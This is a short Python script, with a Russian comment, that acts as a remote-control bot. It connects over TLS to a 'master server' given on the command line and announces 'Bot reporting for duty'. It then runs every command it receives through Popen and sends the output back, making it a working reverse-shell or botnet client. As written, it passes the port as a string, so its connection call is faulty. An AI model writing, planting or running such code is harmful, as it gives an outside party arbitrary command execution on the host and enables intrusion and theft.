import sys
from subprocess import Popen, PIPE
import socket
import ssl
#при запуске скрипта на сервере передаются аргументы с 1) потром подключения 2) ip мастер сервера в локальной сети

serverName = sys.argv[2]
serverPort = sys.argv[1]

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
context.load_cert_chain(certfile='server.crt', keyfile='server.key')

secureSocket = context.wrap_socket(clientSocket, server_hostname=serverName)

secureSocket.connect((serverName, serverPort))
secureSocket.send('Bot reporting for duty'.encode())

command = secureSocket.recv(4064).decode()
while True:
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    secureSocket.send(result)
    command = (secureSocket.recv(4064)).decode()
